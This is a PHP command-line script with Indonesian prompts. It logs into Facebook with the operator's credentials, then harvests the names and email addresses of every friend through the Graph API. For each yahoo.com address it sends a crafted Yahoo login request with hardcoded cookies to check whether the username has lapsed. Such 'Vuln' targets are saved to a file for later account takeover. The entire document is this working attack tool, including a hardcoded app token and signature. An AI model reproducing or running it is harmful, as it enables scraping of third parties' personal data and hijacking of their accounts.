<?php
function curl($url, $headers, $body=false){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	if($body){
		curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
		curl_setopt($ch, CURLOPT_POST, 1);
	}
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	curl_close ($ch);
	return $result;
}
function uniquedec($str){
	$str = preg_replace_callback('/u([0-9a-fA-F]{4})/', function ($match) {
    return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UTF-16BE');
	}, $str);
	return $str;
}
function refreshToken($user, $pass){
	$curl = json_decode(curl("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=$user&locale=en_US&password=$pass&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t", array('content-type: application/x-www-form-urlencoded; charset=UTF-8')), true);
	$atok = @$curl['access_token'];
	return $atok;
}
function Login($user, $pass){
	$curl = json_decode(curl("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=$user&locale=en_US&password=$pass&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t", array('content-type: application/x-www-form-urlencoded; charset=UTF-8')), true);
	$atok = @$curl['access_token'];
	if(empty($atok)){
		echo "Invalid Login Or Challenge";
	}else{
		execute($atok,$user,$pass);
	}
}
function getInfo($id, $atok){
	$curl = json_decode(curl("https://graph.facebook.com/$id?access_token=$atok", array('content-type: application/x-www-form-urlencoded; charset=UTF-8')), true);
	return array(uniquedec(@$curl['name']),uniquedec(@$curl['email']));
}
function cekEmail($email,$info){
	if(!strpos($email, "yahoo.com")) return "Email Bukan yahoo.com";
		if(!in_array($email, @explode("\n", str_replace("\r","",@file_get_contents("vuln.txt"))))) @file_put_contents("yahoo.txt", $email."\n", FILE_APPEND);
	$body = "acrumb=r0ym3wFq&sessionIndex=QQ--&username=$email&passwd=&signin=Berikutnya";
	$headers = array();
	$headers[] = "Host: login.yahoo.com";
	$headers[] = "Connection: close";
	$headers[] = "Content-Length: ". strlen($body);
	$headers[] = "Origin: https://login.yahoo.com";
	$headers[] = "X-Requested-With: XMLHttpRequest";
	$headers[] = "Save-Data: on";
	$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36";
	$headers[] = "content-type: application/x-www-form-urlencoded; charset=UTF-8";
	$headers[] = "Accept: */*";
	$headers[] = "Referer: https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https%3A%2F%2Fid.yahoo.com";
//	$headers[] = "Accept-Encoding: gzip, deflate";
	$headers[] = "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
	$headers[] = "Cookie: B=bsdofupef6m05&b=3&s=cb; AS=v=1&s=r0ym3wFq&d=A5cf4a985|jMIPWu7.2cLJcxs6XpWtNZpfSu2iUEitTvQOpy7dSwi8qrA.eePgXrFlzjOuWI3ZIgukxyDc5QlbZvzr2Rbn3XtnLVtbtdeTW60knzH.pDlDK850tCxhpd9wEKRYbybX08RBESssCSqh7nWvuB70yoG6oasYyYrZAcaU9bpp9jPAG6BK3m03aBqMefBnho7LGPKIfnzoTjYSqOfFGF98RL.B.QjyJ9UnYa9YQftrcKobIZ34LYcv6qNqRv3BeiETawcrxlmpMJg8ieBPfhewfNKBzO.Cqf7afFWmzRSa7qVjKM3xYyB0YVXzPeF.A6XcMyGfjXSIRFJMEj7dOHf5zid0eVfABh_vLuC562VeugHT5VYdcadj28hFObVyb2q5oJu5X5l1WKhhk4k0I6rPW9MO4yNtPcAjfgyuC4K7wYuEIBn90DKCi5sJCzoEaeuYuAOjVWZxib1fxSHJRJDOf6HrM7LQMDq0wEgaJo_1GipXivj80siROrShVwSLG4uBoYdEZmpYC7YUFbAOwFM2XaOt.woKjEJTKsaMeWpSfwvsWKT4WNNU_JHIkVdC3Eyfh52nvNExUiUNCvZWlShWg_spsmS_NfX7dAWtK2M1vPBynuuHgDhS6f8qv0ZuFytSqjEC5CmpYGtsJdQZ2FTCAmkuUd4ln5T1ShjX7Zg.egBRvHkWZkozoo7DIlsiisI-~A";
	$curl = curl("https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd", $headers, $body);
	if(strpos($curl, "messages.ERROR_INVALID_USERNAME")){
		$info = json_encode($info);
		if(!in_array($info, @explode("\n", str_replace("\r","",@file_get_contents("vuln.txt"))))) @file_put_contents("vuln.txt", $info."\n", FILE_APPEND);
		return "Vuln";
	}else{
		return "Not Vuln";
	}
}
function get(){ return trim(fgets(STDIN)); }
function execute($atok,$user,$pass){
	$curl = json_decode(curl("https://graph.facebook.com/me/friends?access_token=$atok", array('content-type: application/x-www-form-urlencoded; charset=UTF-8')), true)['data'];
	$a = 0;
	while($a<count($curl)){
		$id = $curl[$a]['id'];
		$info = getInfo($id, $atok);
		if(empty($info[1])){
			$info[1] = "Can't Get Email This User";
			$cek = "INVALID";
		}else{
			$cek = cekEmail($info[1],$info);
		}
		if(empty($info[0])){
			$atok = refreshToken($user, $pass);
			echo "Refresh Token......\n\n";
		}else{
			echo "Nama : {$info[0]}\nEmail : {$info[1]} [$cek]\n\n";
			$a++;
		}
	}
}
echo "Kalo Vuln disave ke File vuln.txt\n\n";
echo "Login FB Dulu\n";
echo "?Username		";
$user = get();
echo "?Password		";
$pass = get();
Login($user, $pass);
